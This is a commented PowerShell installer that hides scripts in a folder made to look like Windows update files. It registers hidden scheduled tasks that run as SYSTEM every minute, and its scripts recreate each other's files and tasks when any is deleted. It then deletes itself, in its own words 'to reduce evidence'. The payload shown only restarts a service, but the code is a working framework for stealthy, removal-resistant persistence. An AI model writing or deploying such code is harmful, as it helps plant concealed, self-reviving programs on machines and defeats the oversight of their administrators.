# ===[CONFIGURATION SECTION]===

# This sets the stealth folder where all monitor scripts will be stored.
# $env:ProgramData typically resolves to C:\ProgramData on all Windows systems.
# You can change "WinUpdateCache" to another stealthy-looking folder name if needed.
$scriptFolder = "$env:ProgramData\WinUpdateCache"

# This gets the full path to the currently running script (the installer).
# Used later so the installer can delete itself after setup.
$installerPath = $MyInvocation.MyCommand.Path

# Dictionary of monitor script names and their corresponding scheduled task names.
# You can rename the keys/values to customize script or task names.
$monitors = @{
    "WinDriverUpdate" = "WinDriverUpdate_Task"
    "SecuritySync"    = "SecuritySync_Task"
    "UpdateCache"     = "UpdateCache_Task"
}

# ===[ABORT IF INSTALLATION TARGETS ALREADY EXIST]===

# If the stealth folder exists, check for existing monitor scripts.
# If *any* monitor script already exists, abort and delete the installer.
if (Test-Path $scriptFolder) {
    foreach ($monitor in $monitors.Keys) {
        $monitorPath = "$scriptFolder\$monitor.ps1"
        if (Test-Path $monitorPath) {
            Write-Host "A monitor script already exists at $monitorPath. Aborting installer to avoid overwriting." -ForegroundColor Red

            # Schedule self-deletion using a hidden PowerShell instance.
            # This avoids errors from trying to delete a running script.
            Start-Sleep -Milliseconds 500
            Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Start-Sleep -Milliseconds 500; Remove-Item -Path '$installerPath' -Force`"" -WindowStyle Hidden
            exit
        }
    }
} else {
    # Create the folder if it doesn't already exist.
    New-Item -Path $scriptFolder -ItemType Directory -Force | Out-Null
}

# ===[INSTALL MONITOR SCRIPTS AND TASKS]===
foreach ($monitor in $monitors.Keys) {
    $taskName = $monitors[$monitor]
    $scriptPath = "$scriptFolder\$monitor.ps1"
    $siblings = $monitors.Keys | Where-Object { $_ -ne $monitor }

    # This is the content of each monitor script
    # Each script watches for the others and ensures its own scheduled task is always present.
    $monitorScript = @"
# === $monitor.ps1 ===
\$selfName = "$monitor"
\$taskName = "$taskName"
\$scriptFolder = "$scriptFolder"
\$selfPath = "\$scriptFolder\$selfName.ps1"

# Recreate own task if it gets deleted
if (-Not (Get-ScheduledTask -TaskName \$taskName -ErrorAction SilentlyContinue)) {
    \$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"\$selfPath`""
    \$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([TimeSpan]::MaxValue)
    \$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
    \$task = New-ScheduledTask -Action \$action -Trigger \$trigger -Principal \$principal
    Register-ScheduledTask -TaskName \$taskName -InputObject \$task -Force
}

# Check if sibling monitor scripts and their tasks exist, and restore them if missing
\$siblings = @("$($siblings -join '", "')")
foreach (\$sibling in \$siblings) {
    \$siblingPath = "\$scriptFolder\\\$sibling.ps1"
    \$siblingTask = "$($monitors[\$sibling])"

    if (-Not (Test-Path \$siblingPath)) {
        Copy-Item \$selfPath \$siblingPath -Force
    }

    if (-Not (Get-ScheduledTask -TaskName \$siblingTask -ErrorAction SilentlyContinue)) {
        \$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"\$siblingPath`""
        \$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([TimeSpan]::MaxValue)
        \$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        \$task = New-ScheduledTask -Action \$action -Trigger \$trigger -Principal \$principal
        Register-ScheduledTask -TaskName \$siblingTask -InputObject \$task -Force
    }
}

# Monitor and restart critical services
#CHANGE THESE TO WHAT YOU WANT TO MONITOR BEFORE RUNNING
\$servicesToCheck = @("W32Time")
foreach (\$serviceName in \$servicesToCheck) {
    try {
        \$service = Get-Service -Name \$serviceName -ErrorAction Stop
        if (\$service.Status -ne 'Running') {
            Start-Service -Name \$serviceName
        }
    } catch {}
}
"@

    # Save the monitor script to disk
    $monitorScript | Out-File -FilePath $scriptPath -Encoding UTF8 -Force

    # Create the scheduled task for each monitor script if it doesn’t already exist
    if (-Not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
        $action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
        $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).Date -RepetitionInterval (New-TimeSpan -Minutes 1) -RepetitionDuration ([TimeSpan]::MaxValue)
        $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -RunLevel Highest
        $task = New-ScheduledTask -Action $action -Trigger $trigger -Principal $principal
        Register-ScheduledTask -TaskName $taskName -InputObject $task -Force
    }
}

# ===[SELF-DESTRUCT: REMOVE INSTALLER SCRIPT AFTER SETUP]===

# This ensures the installer script deletes itself after execution to reduce evidence
# Spawns a second hidden PowerShell process to remove the file after a short delay
Start-Sleep -Milliseconds 500
Start-Process powershell -ArgumentList "-NoProfile -WindowStyle Hidden -Command `"Start-Sleep -Milliseconds 500; Remove-Item -Path '$installerPath' -Force`"" -WindowStyle Hidden
